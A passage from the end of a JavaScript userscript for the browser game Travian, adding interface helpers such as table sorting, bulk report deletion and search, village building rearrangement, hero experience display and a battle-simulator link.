			return gti(tt,c,1)>0?(gti(tt,c,1)+(gti(tt,c,1)+300*gti(tt,9,1)/7)*(Math.pow(1.007,ul)-1)).toFixed(1):0;
		else
			return (gti(tt,c,1)*Math.pow(1.015,ul)).toFixed(1);
	}
	function trUC (tt,ul) {
		return $em('TR',[$c(ul),$c(sUC(tt,0,ul)),$c(sUC(tt,1,ul)),$c(sUC(tt,2,ul))]);
	}
	function trNull () {
		return $ee('TR',$c('...',[['colspan',4],['style','text-align:center;']]));
	}

	var allD = $xf('.//img[contains(@class,"unit ")]','l',cont);
	for( var i=0; i<allD.snapshotLength; i++ ) {
		var uname = allD.snapshotItem(i).getAttribute('class').match(/\d+/)[0];
		var rpn = allD.snapshotItem(i);
		do {
			rpn = rpn.parentNode;
			var spn = $gt('SPAN',rpn);
		} while( spn.length < 1 )
		if( spn[0].innerHTML.match(/:\d+:/) ) continue;
		var curL = parseInt(spn[0].innerHTML.match(/\d+/)[0]);
		spn[0].addEventListener("mouseover", function(x) { return function() { showUnitUpgrade(x); }}([uname,curL]), false);
		spn[0].addEventListener("mouseout", removeTooltip, false);
		spn[0].appendChild(trImg(allIDs[47]));
	}
}

function stopRP () {
	stopRPFL = false;
	var unsafeWindow = this['unsafeWindow'] || window;
	if(typeof unsafeWindow.auto_reload == 'undefined')
		document.head.appendChild($ee('script','auto_reload=2;',[['type',"text/javascript"]]));
	else
		unsafeWindow.auto_reload=2;
}

function spielerSort() {
	var vtable = $g("villages");
	if ( ! vtable ) return;

	function aSort(a, b) {
		var a = a[lastSC];
		var b = b[lastSC];
		var aa = parseFloat(a.replace(/,/, '.'));
		var bb = parseFloat(b.replace(/,/, '.'));
		if ( isNaN(aa) || isNaN(bb) ) return a < b ? -1: a > b ? 1: 0;
		else return aa - bb;
	}

	function sortSpieler (sc) {
		if( lastSC == sc ) lastSD = 1 - lastSD;
		lastSC = sc;
		vtArr.sort(aSort);
		if( lastSD == 1 ) vtArr.reverse();
		for( var i = 0; i < vtCount; i++ ) {
			vtable.tBodies[0].appendChild(vtArr[i][3]);
		}
	}

	var vtrows = vtable.tHead.rows[ver4FL?0:1];
	var sortCell = ver4FL ? [0,2,4]: [0,1,3];
	for( var i=0; i<3; i++ ) {
		var newSL = $a(vtrows.cells[sortCell[i]].innerHTML,[['href',jsVoid]]);
		newSL.addEventListener('click', function(x) { return function() { sortSpieler(x); }}(i), false);
		vtrows.cells[sortCell[i]].innerHTML = "";
		vtrows.cells[sortCell[i]].appendChild(newSL);
	}

	var lastSD = 1;
	var lastSC = 0;
	var vtrows = vtable.tBodies[0].rows;
	var vtCount = vtrows.length;
	var vtArr = [];
	for (var i = 0; i < vtCount; i++) {
		vtArr[i] = [];
		for( t=0; t < 3; t++ ) vtArr[i][t] = vtrows[i].cells[sortCell[t]].innerHTML.onlyText();
		vtArr[i][3] = vtrows[i];
	}
}

function getNextReportPage ( bl ) {
	var nFL = false;
	if( ver4FL ) {
		var navLink = $gc('next',(bl||cont));
		if( navLink.length > 0 )
			if( navLink[0].getAttribute('href') ) nFL = navLink[0].getAttribute('href');
	} else {
		var t = $g('overview');
		var curPage = crtPath.match(/s=(\d+)/);
		curPage = curPage ? parseInt(curPage[1]): curPage = 0;
		var navLinks = $xf('.//a[contains(@href,"berichte.php?s=")]','l',t);
		for( var i=0; i < navLinks.snapshotLength; i++ ) {
			var pnp = navLinks.snapshotItem(i).getAttribute('href').match(/s=(\d+)/);
			if( pnp ) if( parseInt(pnp[1]) > curPage ) nFL = navLinks.snapshotItem(i).getAttribute('href');
		}
	}
	return nFL;
}

function reportsDelOrSearch () {
	var delBtn = $gn('del');
	if( delBtn.length == 0 ) return;
	var t = $g('overview');
	if( ! t ) return;

	function searchRepInit ( i ) {
		RB.overview[0] = -3;
		RB.overview[1] = i;
		saveCookie('OV', 'overview');
		document.location.href = fullName +'berichte.php?t='+rsc[i][0];
	}
	function searchRep () {
		var ac = $xf('.//tr[.//img[@class="iReport iReport'+rsc[RB.overview[1]][1]+'"]]','l',t);
		if( ac.snapshotLength > 0 ) {
			RB.overview[0] = -1;
			saveCookie('OV', 'overview');
			for( var i=0; i < ac.snapshotLength; i++ ) ac.snapshotItem(i).className = allIDs[46];
		} else {
			var nr = getNextReportPage();
			if( nr ) {
				setTimeout( function() { document.location.href = nr; }, getRandom(300,1000));
			} else {
				RB.overview[0] = -1;
				saveCookie('OV', 'overview');
			}
		}
	}
	function delRep () {
		var nr = getNextReportPage();
		if( ! nr ) {
			RB.overview[0] = -1;
			saveCookie('OV', 'overview');
		}
		var ac = $xf('./tbody//input[@type="checkbox"]','l',t);
		for( var i=0; i<ac.snapshotLength; i++ ) ac.snapshotItem(i).checked=true;
		delBtn[0].click();
	}
	function delRepInit () {
		RB.overview[0] = -4;
		saveCookie('OV', 'overview');
		delRep();
	}

	if( ver4FL ) {
		var newDel = delBtn[0].cloneNode(true);
		var bc = ver42FL?'button-content':'button-contents';
		newDel.setAttribute('title',$gc(bc,newDel)[0].innerHTML.trim());
		$gc(bc,newDel)[0].innerHTML = ltr ? " [X] &gt;&gt; ": " [X] &lt;&lt; ";
	} else {
		newDel = $ee('BUTTON',ltr ? "[X] >>": "[X] <<");
		newDel.setAttribute('title',delBtn[0].getAttribute('alt'));
	}
	delBtn[0].parentNode.appendChild(newDel);
	newDel.setAttribute('onClick',jsNone);
	newDel.addEventListener('click',delRepInit,true);

	dictRpInit();
	var rsc = ver4FL ? [[1,2,1],[1,3,2],[1,5,4],[1,6,5],[1,7,6],[3,17,9],[3,19,11]]:
					[[3,2,1],[3,3,2],[3,5,4],[3,6,5],[3,7,6],[4,17,9],[4,19,11]];
	var sdiv = $ee('DIV',gtext("searchlast")+' : ',[['style','margin:10px;']]);
	for( var i=0; i < rsc.length; i++ ) {
		var nf = trImg(allIDs[45]+' iReport iReport'+rsc[i][1], RB.dictRp[rsc[i][2]]);
		nf.addEventListener('click', function(x) { return function() { searchRepInit(x); }}(i), false);
		sdiv.appendChild(nf);
	}
	if( ver4FL ) insertAfter(sdiv,delBtn[0].parentNode);
	else cont.appendChild(sdiv);

	if( RB.overview[0] == -3 ) searchRep();
	if( RB.overview[0] == -4 ) setTimeout(delRep, getRandom(300,1000));
}

function dictRpInit () {
	loadCookie( 'DictRp', 'dictRp' );
	loadCookie( 'DictRpFL', 'dictRpFL' );
	var FL = false;
	for( var i=0; i < 12; i++ ) {
		if( RB.dictRpFL[i] == 1 ) continue;
		var img = $gc('iReport'+iReports[i],cont);
		if( img.length > 0 ) {
			RB.dictRp[i] = img[0].getAttribute('alt');
			RB.dictRpFL[i] = 1;
			FL = true;
		}
	}
	if( FL ) {
		saveCookie( 'DictRp', 'dictRp' );
		saveCookie( 'DictRpFL', 'dictRpFL' );
	}
}

function getVTip (vID) {
	if( isNaN(vID) || RB.Setup[36] != 1 ) return '';
	var newTip = '';
	if( RB.vHint[vID] != undefined ) newTip = RB.vHint[vID];
	else if( typeof flinks[vID] != 'undefined' ) newTip = flinks[vID];
	return newTip;
}

function convertLinks () {
	function fillObj (arr) {
		for( var i = 0; i < arr.length; i++ ) {
			var oneLink = arr[i].split("\/@_");
			var tVId = parseInt(oneLink[0].match(/d=(\d+)/)[1]);
			flinks[tVId] = oneLink[1];
		}
	}
	flinks = new Object();
	loadVCookie('ln3', 'ln3', village_aid, 1);
	if( RB.ln3[0] == 0 ) RB.ln3.length = 0;
	fillObj(RB.ln3);
	var alinks = RB_getValue(GMcookieID + "ln", "").split("@@_");
	alinks.splice((alinks.length - 1), 1);
	fillObj(alinks);
}

function t3vTip () {
	var h1 = $gt('H1',cont);
	if( h1.length == 0 ) return;
	var ht = getVTip(getVid(crtPath));
	if( ht != '' ) h1[0].appendChild($ee('SPAN',ht,[['style','color:'+vHColor+';margin:0px 10px;']]));
}

function underProgressSave (gid) {
	var upt = $gc('under_progress',cont);
	if( upt.length > 0 ) {
	// [i*4+1 gid, i*4+2 time, i*4+3 description, i*4+4 ending]
		loadZVCookie('Dorf14','village_dorf14');
		var newCookie = [0];
		var fl = false;
		for( var i=0; i<RB.village_dorf14[0]; i++ ) {
			if( RB.village_dorf14[i*4+1] == gid ) continue;
			newCookie[0]++;
			newCookie.push(RB.village_dorf14[i*4+1],RB.village_dorf14[i*4+2],RB.village_dorf14[i*4+3],RB.village_dorf14[i*4+4]);
			fl = true;
		}
		var tinfo_c = new RegExp('"'+allIDs[47]+'"');
		for( var i=1; i<upt[0].rows.length; i++ ) {
			var td = upt[0].rows[i].cells;
			if( td.length < 3 ) break;
			newCookie[0]++;
			var ts = td[1].innerHTML.match(/\d+:\d\d:\d\d/);
			newCookie.push(gid, Math.round(RunTime[0]/1000) + toSeconds(ts?ts[0]:"0:00:00"),
							td[0].innerHTML.replace(/[\n\t]/g,' ').replace(/\s+/g,' ').replace(tinfo_c,'"tinfo_c"'),
							td[2].innerHTML.onlyText());
			fl = true;
		}
		if( fl ) saveVCookie('Dorf14',newCookie,1);
	}
}

function villageBMover () {
	function expCoords (coor) {
		var xy = coor.split(',');
		if( xy[11]-xy[1] < 20 ) {
			for( var i=0; i<5; i++) xy[i*2+1]=parseInt(xy[i*2+1])-40;
		}
		return [xy.join(","),parseInt(xy[0]),parseInt(xy[1])];
	}
	function checkChange () {
		var newCookie = [0];
		for( var i=0; i<crossN.length; i++ ) {
			if( crossN[i] != crossR[i] ) {
				newCookie[0]++;
				newCookie.push(crossR[i],crossN[i]);
			}
		}
		if( newCookie[0] > 0 ) saveVCookie('vBM',newCookie,1);
	}
	function villBMClick ( bn ) {
		if( startFL ) {
			aBuild = crossN[bn];
			imgs[aBuild].setAttribute('style','top:0px;left:'+(ltr?0:505)+'px;z-index:600;');
			zBN = bn;
			startFL = false;
			var xy = expCoords(areas[bn].getAttribute('coords'));
			zImg.setAttribute('style','top:'+(xy[2]+30)+'px;left:'+(xy[1]+(ltr?20:-35))+'px;z-index:500;');
		} else {
			imgs[aBuild].setAttribute('style',iCoords[bn]);
			if( bn == zBN ) {
				startFL = true;
				zImg.setAttribute('style','display:none;');
			} else {
				tBuild = crossN[bn];
				crossN[bn] = aBuild;
				crossN[zBN] = tBuild;
				aBuild = tBuild;
				imgs[aBuild].setAttribute('style','top:0px;left:'+(ltr?0:505)+'px;z-index:600;');
			}
			checkChange();
		}
	}
	function villBMCancel () {
		saveVCookie('vBM',[0],1);
		location.reload(true);
	}
	function villBMStart () {
		if( inAct ) {
			location.reload(true);
		} else {
			for( var i=0; i<areas.length; i++) {
				areas[i].setAttribute('href',jsVoid);
				if( i<areasCount ) {
					areas[i].addEventListener('click',function(x) { return function() { villBMClick(x) }}(i),false);
					iCoords[i] = imgs[i].getAttribute('style');
				}
			}
			for( i=levels.length-1; i>=0; i--) levels[i].parentNode.removeChild(levels[i]);
			act.style.backgroundColor='yellow';
			$at($gt('IMG',act)[0],[['title',gtext("ok")]]);
			var act_r = $ee('DIV',gtext("cancel"),
				[['style','position:absolute;top:10px;left:'+(ltr?510:40)+'px;z-index:500;width:79px;background-color:red;text-align:center;cursor:pointer;']]);
			act_r.addEventListener('click',villBMCancel,false);
			vmap.appendChild(act_r);
			inAct = true;
			zImg = trImg(allIDs[47],'empty');
			zImg.setAttribute('style','display:none;');
			vmap.appendChild(zImg);
		}
	}

	var vmap = $g('village_map');
	if( ! vmap ) return;
	var aBuild = 0;
	var tBuild = 0;
	var aCoords = [];
	var iCoords = [];
	var zBN = 0;
	var zImg = '';
	var imgs = $gc('building',vmap);
	var areas = $gt('AREA',cont);
	var cross = [];
	if( imgs.length < 21 ) return;
	loadZVCookie('vBM','vBM');
	var areasCount = 20;
	for( var i=0; i<areas.length; i++) cross[i]=i;
	var crossN = cross.slice();
	var crossR = cross.slice();
	var levels = $gt('DIV',$g('levels'));
	var levelsRef = [];
	for( i=0; i<levels.length; i++)
		levelsRef[levels[i].getAttribute('class').match(/\d+/)[0]-19]=i;
	if( RB.vBM[0] > 0 ) {
		for( i=0; i<areasCount; i++) {
			aCoords[i] = areas[i].getAttribute('coords');
			iCoords[i] = imgs[i].getAttribute('style');
		}
		for( i=0; i<RB.vBM[0]; i++)	{
			var f = RB.vBM[i*2+1];
			var t = RB.vBM[i*2+2];
			cross[f] = t;
			crossR[t] = f;
			imgs[t].setAttribute('style',iCoords[f]);
			var xy = expCoords(aCoords[f]);
			areas[t].setAttribute('coords',xy[0]);
			if( typeof(levelsRef[t]) != 'undefined' )
				levels[levelsRef[t]].setAttribute('style','left:'+(xy[1]+(ltr?20:-35))+'px; top:'+(xy[2]+10)+'px;');
		}
	}

	var inAct = false;
	var startFL = true;
	var act = $ee('DIV',$e('IMG',[['src',img_bmove],['title',gtext("bmove")]]),
		[['style','position:absolute;top:30px;left:'+(ltr?510:40)+'px;z-index:500;width:79px;height:32px;cursor:pointer;']]);
	act.addEventListener('click',villBMStart,false);
	vmap.appendChild(act);
}

function oasisKirilloid (vf) {
	var troopsTR = $xf('.//tr[td/img[contains(@class, "unit u")]]','l',vf);
	if( troopsTR.snapshotLength < 1 ) return false;

	var kirillRace = ver4FL ? ['','r1','r2']: ['r1','r2','r3'];
	var kirillS = ver4FL ? kirillRace[RB.Setup[2]]+'RuUb#d:p500r3#r3u':
			kirillRace[RB.Setup[2]]+'uR#d:r4p500;r4u';

	var anim = new Array(10);
	for( var i=0; i<troopsTR.snapshotLength; i++ )
		anim[parseInt($gt('IMG',troopsTR.snapshotItem(i))[0].getAttribute('class').match(/\d+/)[0])-31] =
			toNumber(troopsTR.snapshotItem(i).cells[1].innerHTML);

	for(i=0; i<10; i++) kirillS += anim[i] ? anim[i]+',': ',';
	kirillS = '#a:'+kirillS.replace(/,*$/,(ver4FL ? 'U': 'U#'));
	return $a('(kirilloid)',[['href','http://travian.kirilloid.ru/warsim'+(ver4FL?'2':'')+'.php'+kirillS],['target','_blank'],['style','font-size:11px;']]);
}

function showHeroStatus() {
	var heroTbl = $xf('.//table[.//a[contains(@href, "&rename")]]','f',cont);
	if( !(heroTbl) ) return;
	var curLvl = heroTbl.rows[0].cells[0].innerHTML.replace(/<a.+a>|<span.+span>/g,'');
	var hLevel = toNumber(curLvl).NaN0();
	var hPercent = toNumber(heroTbl.rows[heroTbl.rows.length - 1].cells[1].innerHTML);

	var curExp = (hLevel + 1) * 100;
	var curLevelExp = ((curExp) / 2) * hLevel;
	var nextLevelExp = curLevelExp + curExp;
	var realExp = curLevelExp + (hLevel+1) * hPercent;

	insertAfter($em('TABLE',[
			$em('TR',[$c(curLvl),$c(hPercent+'%'),$c((100-hPercent)+'%'),$c(curLvl.replace(/\d+/,(hLevel+1)))]),
			$em('TR',[$c(curLevelExp),$c(realExp),$c(nextLevelExp-realExp),$c(nextLevelExp)]),
		],[['class',allIDs[7]]]),heroTbl);
}

/************************** end test zone ****************************/

// start script
	RunTime[2] = new Date().getTime();
	if( ! ($g('l1')) ) return;
	var userID = getUserID();
	var GMcookieID = crtName + '-' + userID + '-';
	loadCookie ( 'RBSetup', 'Setup' );
	var xyBody = offsetPosition($xf('//body/div[@*="'+(ver42FL?'background':'wrapper')+'"]'));

	loadOVCookie('vHint', 'vHint');
	loadCookie ( 'xy', 'XY' );
	loadCookie ( 'bodyH', 'bodyH' );
	loadCookie ( 'DictFL', 'dictFL' );
	if( ver4FL ) {
		if( ver42FL ) vlist_addButtonsT4n(); else vlist_addButtonsT4();
	} else vlist_addButtons();
	loadCookie ( 'Dict', 'dictionary' );

	if( villages_id[0] == 0 ) if( RB.dictionary[0] == 0 ) {
		document.location.href = fullName + 'spieler.php?uid=' + userID;
	} else {
		villages_id[0] = parseInt(RB.dictionary[0]);
		village_aid = villages_id[0];
	}
	loadAllCookie();
	var LC = setLC();
	var arena = RB.dictFL[3] == 0 ? gtext("arena") : RB.dictionary[3];

	//save "produce per hour"
	if( ! getResources() ) return;
	if( /dorf[12].php/.test(crtPath) ) parseDorf1();

	if( RB.overview[0] > -1 ) {
		var i =  parseInt(RB.overview[0]) +1;
		if( i > villages_count ) {
			RB.overview[0] = -2;
			saveCookie('OV', 'overview');
			setTimeout( function() { document.location.href = RB.overview[1]; }, getRandom(300,1000));
		} else {
			RB.overview[0] = i;
			saveCookie('OV', 'overview');
			var newdid = linkVSwitch[i-1].match(/newdid=\d+/i)[0];
			setTimeout( function() { document.location.href = fullName +'dorf1.php?'+ newdid; }, getRandom(300,1000));
		}
		return;
	} else if( RB.overview[0] == -2 ) {
		RB.overview[0] = -1;
		RB.overview[1] = Math.round(RunTime[0]/1000);
		saveCookie('OV', 'overview');
		overviewAll();
	}

	progressbar_init();
	convertLinks();

	var cont = $g(pageElem[1]);
	var contXY = offsetPosition( cont );
	var contRight = ltr ?  contXY[0] + cont.clientWidth : contXY[0];
	var contTop = contXY[1];

	if( RB.Setup[45] > 1 && sM < 2 ) { sM = parseInt(RB.Setup[45]); sC = [16/sM,100]; }
	if( /dorf1.php/.test(crtPath) ) { troopsDorf1(); normalizeProduction(); }
	if( /dorf[12].php/.test(crtPath) || ver4FL ) villageHintEdit();
	if( /dorf2.php/.test(crtPath) ) { parseDorf2(); if( ver4FL && RB.Setup[37] > 0 ) villageBMover(); }
	if( /dorf3.php/.test(crtPath) ) villageHintDorf3();
	if( /(?:nachrichten|berichte).php/.test(crtPath) ) { deleteButtonAdd(); viewMessageIW();  }
	if( /berichte.php/.test(crtPath) ) reportsDelOrSearch(); else if( RB.overview[0] < -2 ) { RB.overview[0] = -1; saveCookie('OV', 'overview'); }
	if( /nachrichten.php\?.*id=/.test(crtPath) ) convertCoordsInMessagesToLinks();
	if( /karte.php\?(.*&)?d=\d+&c=/.test(crtPath) ) { troopsOasis(); viewMessageIWK(); t3vTip(); }
	if( /karte.php\?(.*&)?[zdxy]=/.test(crtPath) ) { distanceToMyVillages(); if( ver4FL ) linkOnT4Karte(); }
	if( /karte.php/.test(crtPath) ) { karteDistance(); cropFind(); }
	if( /position_details.php\?(.*&)?[zdxy]=/.test(crtPath) ) { troopsOasis(); distanceToMyVillages(); viewMessageIWK(); linkOnT4Karte(); addToMapT4(); addFarmToMapT4(); }
	if( crtPath.indexOf('allianz.php') != -1 ) {
		if( $g('offs') ) { viewMessageIWK(); addAReportFilter(); }
		if( $g('member') ) { allyActivityInfo(); allyQStats(); }
		parseAlly();
	}
	if( /spieler.php/.test(crtPath) ) { distanceToTargetVillages(); parseSpieler(); userActivityInfo(); spielerSort(); if( ! ver4FL ) resourceBalance(); }
	if( crtPath.indexOf('a2b.php') != -1 ) { fillXYtoRP(); rpDefaultAction(); abFL=true;}
	if( /berichte.php.+id=/.test(crtPath) ) { addSpeedAndRTSend(); analyzerBattle(); }
	if( ! /dorf.\.php/.test(crtPath) ) addRefIGM();
	if( /hero_auction.php/.test(crtPath) ) { speedBids(); timeToBids(); }
	if( /hero_inventory.php/.test(crtPath) ) { neededResAdd(); restHeroTime(); saveHeroSpeed(); addSpeedAndRTSend(); }
	if( /adventure.php/.test(crtPath) ) addSpeedAndRTSend($gc('boxes',cont)[0]);
	if( /build.php/.test(crtPath) ) {
		neededResAdd();
		buildDispatcher();
		addSpeedAndRTSend();
	}

	setTimeout( function() { progressbar_updValues(); setInterval(progressbar_updValues, 1000); }, (1000-progressbar_time-((new Date().getTime())-RunTime[0])));
	if( RB.Setup[16] > 0 ) bigQuickLinks();
	if( RB.Setup[14] > 0 ) showDorf1();
	if( RB.Setup[12] > 0 ) showLinks();
	if( RB.Setup[17] == 1 ) rbNotes();
	if( RB.Setup[7] == 1 && ! ver4FL ) { $at($g(pageElem[2]),[['style','width:auto;']]); setTimeout(pageNoWrap, 500); }
	addSpeedRTSendMessageInLLinks();
	if( RB.Setup[20] > 0 ) if( RB.dictFL[13] < 2 || RB.Setup[20] == 2 ) scanTropsData();
	if( ver4FL ) returnQuickHelp();
	if( RB.Setup[32] == 1 ) centerNumber();
	if( RB.Setup[34] == 1 ) overviewAll();
	if( nextFL ) if( RB_getValue(GMcookieID + 'next', -1) > 0 ) RB_setValue(GMcookieID + 'next', -1);
	detectAttack();
	showRunTime();

/********** end of main code block ************/
}

function backupStart () {
	if(notRunYet) {
		var l4 = document.getElementById('l4');
		if( l4 ) allInOneOpera();
		else setTimeout(backupStart, 500);
	}
}

var notRunYet = true;
if( /khtml/i.test(navigator.appVersion) ) allInOneOpera();
else if (window.addEventListener) window.addEventListener("load",function () { if(notRunYet) allInOneOpera(); },false);
setTimeout(backupStart, 500);

})();
